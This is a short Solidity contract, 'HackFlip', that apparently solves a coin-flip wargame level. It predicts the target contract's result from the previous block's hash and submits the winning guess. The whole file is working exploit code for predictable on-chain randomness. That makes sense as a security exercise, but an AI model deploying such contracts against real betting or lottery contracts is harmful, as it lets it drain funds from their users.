pragma solidity ^0.8.0;

import "./CoinFlip.sol";  

contract HackFlip {

    CoinFlip public originalContract;
    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; 

    constructor(address _originalContractAddr) public {
        originalContract = CoinFlip(_originalContractAddr); 
    }


    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number-1)); 
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false; 

        originalContract.flip(side); 

    }

}